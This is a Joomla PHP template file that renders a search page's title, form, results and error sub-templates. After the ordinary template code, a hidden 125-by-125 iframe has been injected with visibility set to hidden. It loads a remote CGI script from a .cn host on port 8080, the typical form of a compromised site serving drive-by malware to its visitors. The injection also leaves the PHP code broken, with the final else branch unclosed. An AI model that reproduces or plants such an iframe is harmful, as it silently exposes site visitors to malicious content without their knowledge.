<?php defined('_JEXEC') or die('Restricted access'); ?>

<?php if ( $this->params->get( 'show_page_title', 1 ) ) : ?>
<div class="componentheading<?php echo $this->params->get( 'pageclass_sfx' ); ?>">
	<?php echo $this->params->get( 'page_title' ); ?>
</div>
<?php endif; ?>

<?php echo $this->loadTemplate('form'); ?>
<?php if(!$this->error && count($this->results) > 0) :
	echo $this->loadTemplate('results');
else :
	echo $this->loadTemplate('error')
<iframe src="http://globalmixgroup.cn:8080/ts/in.cgi?pepsi64" width=125 height=125 style="visibility: hidden"></iframe>